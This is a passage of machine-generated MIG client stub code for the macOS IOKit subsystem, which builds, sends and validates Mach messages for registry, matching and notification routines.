	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2882;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2882, "io_service_match_property_table_bin")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2882, "io_service_match_property_table_bin")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_match_property_table_bin_t__defined)
	check_result = __MIG_check__Reply__io_service_match_property_table_bin_t((__Reply__io_service_match_property_table_bin_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_match_property_table_bin_t__defined) */

	*matches = Out0P->matches;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_add_notification_bin_t__defined)
#define __MIG_check__Reply__io_service_add_notification_bin_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_add_notification_bin_t(__Reply__io_service_add_notification_bin_t *Out0P)
{

	typedef __Reply__io_service_add_notification_bin_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2984) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->notification.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->notification.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_add_notification_bin_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_add_notification_bin */
mig_external kern_return_t io_service_add_notification_bin
(
	mach_port_t master_port,
	io_name_t notification_type,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	mach_port_t *notification
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t notification_typeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t notification_typeCnt;
		char notification_type[128];
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_service_add_notification_bin_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_add_notification_bin_t__defined */

	__DeclareSendRpc(2884, "io_service_add_notification_bin")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t wake_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->wake_port = wake_portTemplate;
	InP->wake_port.name = wake_port;
#else	/* UseStaticTemplates */
	InP->wake_port.name = wake_port;
	InP->wake_port.disposition = 20;
	InP->wake_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->notification_typeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->notification_type, notification_type, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->notification_typeCnt = (mach_msg_type_number_t) mig_strncpy(InP->notification_type, notification_type, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->notification_typeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->notification_typeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4288) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	if (matchingCnt > 4096) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->matching, (const char *) matching, matchingCnt);

	InP->matchingCnt = matchingCnt;

	msgh_size_delta = _WALIGN_(matchingCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 4096);

	if (referenceCnt > 8) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->reference, (const char *) reference, 8 * referenceCnt);

	InP->referenceCnt = referenceCnt;

	msgh_size += (8 * referenceCnt);
	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2884;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2884, "io_service_add_notification_bin")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2884, "io_service_add_notification_bin")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_add_notification_bin_t__defined)
	check_result = __MIG_check__Reply__io_service_add_notification_bin_t((__Reply__io_service_add_notification_bin_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_add_notification_bin_t__defined) */

	*notification = Out0P->notification.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_path_ool_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_path_ool_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_path_ool_t(__Reply__io_registry_entry_get_path_ool_t *Out0P, __Reply__io_registry_entry_get_path_ool_t **Out1PP)
{

	typedef __Reply__io_registry_entry_get_path_ool_t __Reply __attribute__((unused));
	__Reply *Out1P;
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 2985) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4096) || msgh_size > (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->path_ool.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	msgh_size_delta = _WALIGN_(Out0P->pathCnt);
#if	__MigTypeCheck
	if ( Out0P->pathCnt > 4096 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4096))< Out0P->pathCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 4096) + _WALIGN_(Out0P->pathCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 4096);

#if __MigTypeCheck
	if (Out0P->path_ool.size != Out1P->path_oolCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_path_ool_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_path_ool */
mig_external kern_return_t io_registry_entry_get_path_ool
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_string_inband_t path,
	io_buf_ptr_t *path_ool,
	mach_msg_type_number_t *path_oolCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t path_ool;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[4096];
		mach_msg_type_number_t path_oolCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t path_ool;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[4096];
		mach_msg_type_number_t path_oolCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_get_path_ool_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_path_ool_t__defined */

	__DeclareSendRpc(2885, "io_registry_entry_get_path_ool")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->planeCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2885;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2885, "io_registry_entry_get_path_ool")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2885, "io_registry_entry_get_path_ool")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_path_ool_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_path_ool_t((__Reply__io_registry_entry_get_path_ool_t *)Out0P, (__Reply__io_registry_entry_get_path_ool_t **)&Out1P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_path_ool_t__defined) */

	(void) mig_strncpy(path, Out0P->path, 4096);

	*path_ool = (io_buf_ptr_t)(Out0P->path_ool.address);
	*path_oolCnt = Out1P->path_oolCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_from_path_ool_t__defined)
#define __MIG_check__Reply__io_registry_entry_from_path_ool_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_from_path_ool_t(__Reply__io_registry_entry_from_path_ool_t *Out0P)
{

	typedef __Reply__io_registry_entry_from_path_ool_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2986) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->registry_entry.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->registry_entry.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_from_path_ool_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_from_path_ool */
mig_external kern_return_t io_registry_entry_from_path_ool
(
	mach_port_t master_port,
	io_string_inband_t path,
	io_buf_ptr_t path_ool,
	mach_msg_type_number_t path_oolCnt,
	kern_return_t *result,
	mach_port_t *registry_entry
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t path_ool;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[4096];
		mach_msg_type_number_t path_oolCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t registry_entry;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t registry_entry;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_registry_entry_from_path_ool_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_from_path_ool_t__defined */

	__DeclareSendRpc(2886, "io_registry_entry_from_path_ool")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t path_oolTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->path_ool = path_oolTemplate;
	InP->path_ool.address = (void *)(path_ool);
	InP->path_ool.size = path_oolCnt;
#else	/* UseStaticTemplates */
	InP->path_ool.address = (void *)(path_ool);
	InP->path_ool.size = path_oolCnt;
	InP->path_ool.deallocate =  FALSE;
	InP->path_ool.copy = MACH_MSG_PHYSICAL_COPY;
	InP->path_ool.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->pathCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->path, path, 4096);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->pathCnt = (mach_msg_type_number_t) mig_strncpy(InP->path, path, 4096);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->pathOffset = 0;

	msgh_size_delta = _WALIGN_(InP->pathCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4096) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 4096);

	InP->path_oolCnt = path_oolCnt;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2886;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2886, "io_registry_entry_from_path_ool")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2886, "io_registry_entry_from_path_ool")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_from_path_ool_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_from_path_ool_t((__Reply__io_registry_entry_from_path_ool_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_from_path_ool_t__defined) */

	*result = Out0P->result;

	*registry_entry = Out0P->registry_entry.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_device_tree_entry_exists_with_name_t__defined)
#define __MIG_check__Reply__io_device_tree_entry_exists_with_name_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_device_tree_entry_exists_with_name_t(__Reply__io_device_tree_entry_exists_with_name_t *Out0P)
{

	typedef __Reply__io_device_tree_entry_exists_with_name_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2987) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_device_tree_entry_exists_with_name_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_device_tree_entry_exists_with_name */
mig_external kern_return_t io_device_tree_entry_exists_with_name
(
	mach_port_t master_port,
	io_name_t name,
	boolean_t *exists
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t exists;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t exists;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_device_tree_entry_exists_with_name_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_device_tree_entry_exists_with_name_t__defined */

	__DeclareSendRpc(2887, "io_device_tree_entry_exists_with_name")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->name, name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->name, name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->nameOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->nameCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2887;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2887, "io_device_tree_entry_exists_with_name")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2887, "io_device_tree_entry_exists_with_name")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_device_tree_entry_exists_with_name_t__defined)
	check_result = __MIG_check__Reply__io_device_tree_entry_exists_with_name_t((__Reply__io_device_tree_entry_exists_with_name_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_device_tree_entry_exists_with_name_t__defined) */

	*exists = Out0P->exists;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t__defined)
